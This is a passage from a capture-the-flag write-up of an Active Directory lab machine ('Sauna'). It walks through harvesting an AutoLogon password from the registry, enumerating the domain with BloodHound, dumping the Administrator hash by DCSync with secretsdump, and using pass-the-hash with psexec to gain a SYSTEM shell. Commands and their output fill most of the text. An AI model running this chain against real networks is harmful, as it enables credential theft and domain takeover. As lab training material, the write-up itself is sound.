egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID          Attributes  
=========================================== ================ ============ ==================================================  
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  
  
USER CLAIMS INFORMATION  
-----------------------  
  
User claims unknown.  
  
Kerberos support for Dynamic Access Control on this device has been disabled.

*Evil-WinRM* PS C:\Users\FSmith\Desktop> net user  
  
User accounts for \\  
  
-------------------------------------------------------------------------------  
Administrator            FSmith                   Guest  
HSmith                   krbtgt                   svc_loanmgr  
The command completed with one or more errors.
```

I install winPEAS :

```bash
> sudo pacman -s peass

>  pacman -Ql peass | grep -iE 'winpeas.*\.exe$'  
  
peass /usr/share/windows/peass/winPEASany.exe  
peass /usr/share/windows/peass/winPEASany_ofs.exe  
peass /usr/share/windows/peass/winPEASx64.exe  
peass /usr/share/windows/peass/winPEASx64_ofs.exe  
peass /usr/share/windows/peass/winPEASx86.exe  
peass /usr/share/windows/peass/winPEASx86_ofs.exe
```

Back on the shell :

```PowerShell
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload /usr/share/windows/peass/winPEASx64.exe
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEASx64.exe
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  
  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  
   AutoRestartShell    REG_DWORD    0x1  
   Background    REG_SZ    0 0 0  
   CachedLogonsCount    REG_SZ    10  
   DebugServerCommand    REG_SZ    no  
   DefaultDomainName    REG_SZ    EGOTISTICALBANK  
   DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager  
   DisableBackButton    REG_DWORD    0x1  
   EnableSIHostIntegration    REG_DWORD    0x1  
   ForceUnlockLogon    REG_DWORD    0x0  
   LegalNoticeCaption    REG_SZ  
   LegalNoticeText    REG_SZ  
   PasswordExpiryWarning    REG_DWORD    0x5  
   PowerdownAfterShutdown    REG_SZ    0  
   PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}  
   ReportBootOk    REG_SZ    1  
   Shell    REG_SZ    explorer.exe  
   ShellCritical    REG_DWORD    0x0  
   ShellInfrastructure    REG_SZ    sihost.exe  
   SiHostCritical    REG_DWORD    0x0  
   SiHostReadyTimeOut    REG_DWORD    0x0  
   SiHostRestartCountLimit    REG_DWORD    0x0  
   SiHostRestartTimeGap    REG_DWORD    0x0  
   Userinit    REG_SZ    C:\Windows\system32\userinit.exe,  
   VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile  
   WinStationsDisabled    REG_SZ    0  
   scremoveoption    REG_SZ    0  
   DisableCAD    REG_DWORD    0x1  
   LastLogOffEndTimePerfCounter    REG_QWORD    0x8c9319f7  
   ShutdownFlags    REG_DWORD    0x8000022b  
   DisableLockWorkstation    REG_DWORD    0x0  
   DefaultPassword    REG_SZ    Moneymakestheworldgoround!  
  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey  
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

And we got the password `Moneymakestheworldgoround!`

```bash
>  bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All  
  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: egotistical-bank.local  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not known  
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL  
INFO: Testing resolved hostname connectivity dead:beef::58d:c22a:d5d3:eb8e  
INFO: Trying LDAP connection to dead:beef::58d:c22a:d5d3:eb8e  
INFO: Testing resolved hostname connectivity dead:beef::ba  
INFO: Trying LDAP connection to dead:beef::ba  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL  
INFO: Testing resolved hostname connectivity dead:beef::58d:c22a:d5d3:eb8e  
INFO: Trying LDAP connection to dead:beef::58d:c22a:d5d3:eb8e  
INFO: Testing resolved hostname connectivity dead:beef::ba  
INFO: Trying LDAP connection to dead:beef::ba  
INFO: Found 7 users  
INFO: Found 52 groups  
INFO: Found 3 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL  
INFO: Done in 00M 21S
```

```bash
echo '10.129.95.180 sauna.htb SAUNA.EGOTISTICAL-BANK.LOCAL EGOTISTICAL-BANK.LOCAL egotistical-bank.local' | sudo tee -a /etc/hosts
```

```bash
evil-winrm -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

"svc_loanmgr" makes us think that this user is a loan manager, which makes him higher placed as fsmith in the hierarchy of the bank and as such, might have access to more sensirtive data.

```PowerShell
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> cd /  
*Evil-WinRM* PS C:\> dir -Force  
  
  
   Directory: C:\  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d--hs-        5/23/2026   9:44 AM                $Recycle.Bin  
d--hsl        1/22/2020   9:31 PM                Documents and Settings  
d-----        1/23/2020   8:48 AM                inetpub  
d-----        9/15/2018  12:19 AM                PerfLogs  
d-r---        7/13/2021  10:54 AM                Program Files  
d-----        1/23/2020   3:11 PM                Program Files (x86)  
d--h--        7/13/2021  10:53 AM                ProgramData  
d--hs-        1/22/2020   9:31 PM                Recovery  
d--hs-        1/22/2020  10:01 PM                System Volume Information  
d-r---        1/24/2020   4:05 PM                Users  
d-----        7/14/2021   3:28 PM                Windows  
-a-hs-        5/23/2026   6:49 AM      738197504 pagefile.sys  
  
  
*Evil-WinRM* PS C:\> cd Recovery  
*Evil-WinRM* PS C:\Recovery> dir  
Access to the path 'C:\Recovery' is denied.  
At line:1 char:1  
+ dir  
+ ~~~  
   + CategoryInfo          : PermissionDenied: (C:\Recovery:String) [Get-ChildItem], UnauthorizedAccessException  
   + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
     
*Evil-WinRM* PS C:\Recovery> whoami /all  
  
USER INFORMATION  
----------------  
  
User Name                   SID  
=========================== ==============================================  
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID          Attributes  
=========================================== ================ ============ ==================================================  
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  
  
USER CLAIMS INFORMATION  
-----------------------  
  
User claims unknown.  
  
Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Recovery> cd /  
*Evil-WinRM* PS C:\> dir -Force  
  
  
   Directory: C:\  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d--hs-        5/23/2026   9:44 AM                $Recycle.Bin  
d--hsl        1/22/2020   9:31 PM                Documents and Settings  
d-----        1/23/2020   8:48 AM                inetpub  
d-----        9/15/2018  12:19 AM                PerfLogs  
d-r---        7/13/2021  10:54 AM                Program Files  
d-----        1/23/2020   3:11 PM                Program Files (x86)  
d--h--        7/13/2021  10:53 AM                ProgramData  
d--hs-        1/22/2020   9:31 PM                Recovery  
d--hs-        1/22/2020  10:01 PM                System Volume Information  
d-r---        1/24/2020   4:05 PM                Users  
d-----        7/14/2021   3:28 PM                Windows  
-a-hs-        5/23/2026   6:49 AM      738197504 pagefile.sys  
  
  
*Evil-WinRM* PS C:\> cd "/Program Files"  
*Evil-WinRM* PS C:\Program Files> cd  
*Evil-WinRM* PS C:\Program Files> ls  
  
  
   Directory: C:\Program Files  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----        1/23/2020  10:52 AM                Common Files  
d-----        1/23/2020   3:08 PM                internet explorer  
d-----        7/13/2021  10:54 AM                VMware  
d-r---        1/23/2020   3:08 PM                Windows Defender  
d-----        1/23/2020   3:08 PM                Windows Defender Advanced Threat Protection  
d-----        9/15/2018  12:19 AM                Windows Mail  
d-----        1/23/2020   3:08 PM                Windows Media Player  
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform  
d-----        9/15/2018  12:28 AM                windows nt  
d-----        1/23/2020   3:08 PM                Windows Photo Viewer  
d-----        9/15/2018  12:19 AM                Windows Portable Devices  
d-----        9/15/2018  12:19 AM                Windows Security  
d-----        9/15/2018  12:19 AM                WindowsPowerShell  
  
  
*Evil-WinRM* PS C:\Program Files> cd Common Files  
A positional parameter cannot be found that accepts argument 'Files'.  
At line:1 char:1  
+ cd Common Files  
+ ~~~~~~~~~~~~~~~  
   + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException  
   + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand  
*Evil-WinRM* PS C:\Program Files> cd "Common Files"  
*Evil-WinRM* PS C:\Program Files\Common Files> dir -Force  
  
  
   Directory: C:\Program Files\Common Files  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----        1/23/2020  10:52 AM                microsoft shared  
d-----        9/15/2018  12:19 AM                Services  
d-----        9/15/2018   2:05 AM                system  
d-----        7/13/2021  10:54 AM                VMware  
  
  
*Evil-WinRM* PS C:\Program Files\Common Files> cd "microsoft shared"  
*Evil-WinRM* PS C:\Program Files\Common Files\microsoft shared> dir -Force  
  
  
   Directory: C:\Program Files\Common Files\microsoft shared  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----        1/23/2020   3:08 PM                ink  
d-----        9/15/2018   2:05 AM                MSInfo  
d-----        9/15/2018  12:19 AM                Stationery  
d-----        9/15/2018   2:05 AM                TextConv  
d-----        9/15/2018   2:05 AM                Triedit  
d-----        1/23/2020  10:52 AM                VC  
d-----        9/15/2018  12:19 AM                vgx  
  
  
*Evil-WinRM* PS C:\Program Files\Common Files\microsoft shared>
```

```bash
>  ls -la *.json  
zip sauna_bh.zip *.json  
-rw-r--r-- 1 vagabond vagabond  4217 May 23 11:48 20260523114806_computers.json  
-rw-r--r-- 1 vagabond vagabond 25288 May 23 11:48 20260523114806_containers.json  
-rw-r--r-- 1 vagabond vagabond  3601 May 23 11:48 20260523114806_domains.json  
-rw-r--r-- 1 vagabond vagabond  6100 May 23 11:48 20260523114806_gpos.json  
-rw-r--r-- 1 vagabond vagabond 83554 May 23 11:48 20260523114806_groups.json  
-rw-r--r-- 1 vagabond vagabond  1975 May 23 11:48 20260523114806_ous.json  
-rw-r--r-- 1 vagabond vagabond 16286 May 23 11:48 20260523114806_users.json  
 adding: 20260523114806_computers.json (deflated 76%)  
 adding: 20260523114806_containers.json (deflated 93%)  
 adding: 20260523114806_domains.json (deflated 79%)  
 adding: 20260523114806_gpos.json (deflated 89%)  
 adding: 20260523114806_groups.json (deflated 94%)  
 adding: 20260523114806_ous.json (deflated 69%)  
 adding: 20260523114806_users.json (deflated 92%)
```

svc_loanmgr gives us the hash for admin because of DC over-privileged misconfiguration :

```bash
>  secretsdump.py 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!'@10.129.95.180 -just-dc-user Administrator  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657  
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e  
Administrator:des-cbc-md5:fb8f321c64cea87f  
[*] Cleaning up...
```

```PowerShell
> psexec.py 'EGOTISTICAL-BANK.LOCAL/administrator@10.129.95.180' -hashes ':823452073d75b9d1cf70ebdf86c7f98e'  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Requesting shares on 10.129.95.180.....  
[*] Found writable share ADMIN$  
[*] Uploading file bhCavorx.exe  
[*] Opening SVCManager on 10.129.95.180.....  
[*] Creating service qlQB on 10.129.95.180.....  
[*] Starting service qlQB.....  
[!] Press help for extra shell commands  
Microsoft Windows [Version 10.0.17763.973]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32> cd /Users/Administrator  
   
C:\Users\Administrator> dir  
Volume in drive C has no label.  
Volume Serial Number is 489C-D8FC  
  
Directory of C:\Users\Administrator  
  
01/25/2020  02:05 PM    <DIR>          .  
01/25/2020  02:05 PM    <DIR>          ..  
01/23/2020  04:11 PM    <DIR>          3D Objects  
01/23/2020  04:11 PM    <DIR>          Contacts  
07/14/2021  03:35 PM    <DIR>          Desktop  
01/23/2020  04:11 PM    <DIR>          Documents  
01/23/2020  04:11 PM    <DIR>          Downloads  
01/23/2020  04:11 PM    <DIR>          Favorites  
01/23/2020  04:11 PM    <DIR>          Links  
01/23/2020  04:11 PM    <DIR>          Music  
01/23/2020  04:11 PM    <DIR>          Pictures  
01/23/2020  04:11 PM    <DIR>          Saved Games  
01/23/2020  04:11 PM    <DIR>          Searches  
01/23/2020  04:11 PM    <DIR>          Videos  
              0 File(s)              0 bytes  
             14 Dir(s)   7,807,094,784 bytes free
   
C:\Users\Administrator> cd \Users\Administrator\Desktop  
   
C:\Users\Administrator\Desktop> dir  
Volume in drive C has no label.  
Volume Serial Number is 489C-D8FC  
  
Directory of C:\Users\Administrator\Desktop  
  
07/14/2021  03:35 PM    <DIR>          .  
07/14/2021  03:35 PM    <DIR>          ..  
05/23/2026  06:51 AM                34 root.txt  
              1 File(s)             34 bytes  
              2 Dir(s)   7,807,094,784 bytes free
              
C:\Users\Administrator\Desktop> type root.txt  
246a0d4421d51ee230223ef98b586e24          
```

And we got the root flag.

```PowerShell
C:\Users\Administrator\Desktop> systeminfo  
   
Host Name:                 SAUNA  
OS Name:                   Microsoft Windows Server 2019 Datacenter  
OS Version:                10.0.17763 N/A Build 17763  
OS Manufacturer:           Microsoft Corporation  
OS Configuration:          Primary Domain Controller  
OS Build Type:             Multiprocessor Free  
Registered Owner:          Windows User  
Registered Organization:      
Product ID:                00430-10710-91142-AA957  
Original Install Date:     1/22/2020, 10:32:10 PM  
System Boot Time:          5/23/2026, 6:49:49 AM  
System Manufacturer:       VMware, Inc.  
System Model:              VMware Virtual Platform  
System Type:               x64-based PC  
Processor(s):              2 Processor(s) Installed.  
                          [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz  
                          [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz  
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020  
Windows Directory:         C:\Windows  
System Directory:          C:\Windows\system32  
Boot Device:               \Device\HarddiskVolume1  
System Locale:             en-us;English (United States)  
Input Locale:              en-gb;English (United Kingdom)  
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)  
Total Physical Memory:     4,095 MB  
Available Physical Memory: 2,735 MB  
Virtual Memory: Max Size:  4,799 MB  
Virtual Memory: Available: 3,512 MB  
Virtual Memory: In Use:    1,287 MB  
Page File Location(s):     C:\pagefile.sys  
Domain:                    EGOTISTICAL-BANK.LOCAL  
Logon Server:              N/A  
Hotfix(s):                 4 Hotfix(s) Installed.  
                          [01]: KB4532947  
                          [02]: KB4516115  
                          [03]: KB4523204  
                          [04]: KB4534273  
Network Card(s):           1 NIC(s) Installed.  
                          [01]: vmxnet3 Ethernet Adapter  
                                Connection Name: Ethernet0 2  
                                DHCP Enabled:    Yes  
                                DHCP Server:     10.10.10.2  
                                IP address(es)  
                                [01]: 10.129.95.180  
                                [02]: fe80::58d:c22a:d5d3:eb8e  
                                [03]: dead:beef::58d:c22a:d5d3:eb8e  
                                [04]: dead:beef::ba  
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.  
  
C:\Users\Administrator\Desktop> whoami  
nt authority\system
```
